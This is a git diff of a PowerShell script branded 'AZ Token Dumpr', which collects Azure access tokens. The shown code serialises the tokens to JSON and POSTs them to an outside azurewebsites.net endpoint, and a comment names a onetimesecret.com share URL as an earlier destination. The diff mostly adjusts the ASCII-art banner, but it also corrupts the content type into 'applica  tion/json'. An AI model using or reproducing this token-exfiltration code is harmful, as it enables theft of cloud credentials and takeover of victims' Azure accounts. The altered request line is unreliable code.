@@ -50,13 +50,14 @@ function AccessToken {
         $tokens = @()
 
 $logo = @"
-        ______      __              ____                            
+  ______      __              ____                            
  /_  __/___  / /_____  ____  / __ \__  ______ ___  ____  _____
   / / / __ \/ //_/ _ \/ __ \/ / / / / / / __ `__ \/ __ \/ ___/
  / / / /_/ / ,< /  __/ / / / /_/ / /_/ / / / / / / /_/ / /    
 /_/  \____/_/|_|\___/_/ /_/_____/\__,_/_/ /_/ /_/ .___/_/     
-                                               /_/            
-              --- AZ Token Dumpr v$version ---
+                                               /_/ 
+           
+             --- AZ Token Dumpr v$version ---
 "@
 
         Write-Host $logo
@@ -80,7 +81,7 @@ $logo = @"
         $requestParam = @{
             Uri    = 'https://opt-c5ggh6adhzbvezdj.westeurope-01.azurewebsites.net/api/add?' #'https://us.onetimesecret.com/api/v1/share'
             Method = 'POST'
-            ContentType = 'application/json'
+            ContentType = 'applica  tion/json'
             Body   = @{
                 action       = "create"
                 secret_value = $tokens | ConvertTo-Json -Depth 10
